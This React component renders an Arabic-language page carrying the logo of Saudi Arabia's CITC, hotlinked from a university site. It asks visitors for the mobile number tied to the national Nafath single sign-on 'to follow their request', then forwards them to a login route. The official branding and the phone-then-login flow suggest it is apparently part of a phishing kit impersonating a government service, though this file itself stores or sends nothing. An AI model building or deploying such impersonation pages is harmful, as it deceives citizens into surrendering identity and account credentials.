import React from "react";
import { useNavigate } from "react-router";

function PhoneNum() {
  const nav = useNavigate();
  const handelSubmit = function (e) {
    e.preventDefault();
    nav("/login");
  };
  return (
    <div className="bg-white">
      <div
        className="p-4 rounded-lg border shadow-lg  max-w-[650px] mx-auto  text-slate-700"
        style={{ direction: "ltr" }}
      >
        <div>
          <img
            src="https://cday.kfupm.edu.sa/Content/File_Upload/217594437CITC-logo.png"
            alt=""
          />
        </div>
        <h3 className="font-semibold text-2xl  text-center">
          تابع تفاصيل طلبك
        </h3>
        <form className="my-6 py-16" onSubmit={(e) => handelSubmit(e)}>
          <h4 className="font-semibold text-xl  text-center">
            قم بادخال رقم الجوال المرتبط بالنفاذ الوطني الموحد لمتابعة الطلب
          </h4>
          <input required type="text" className="input-text" />
          <button className="bg-main w-1/2 mx-auto p-3 rounded-lg block text-white font-semibold text-xl my-4">
            تاكيد
          </button>
        </form>
      </div>
    </div>
  );
}

export default PhoneNum;
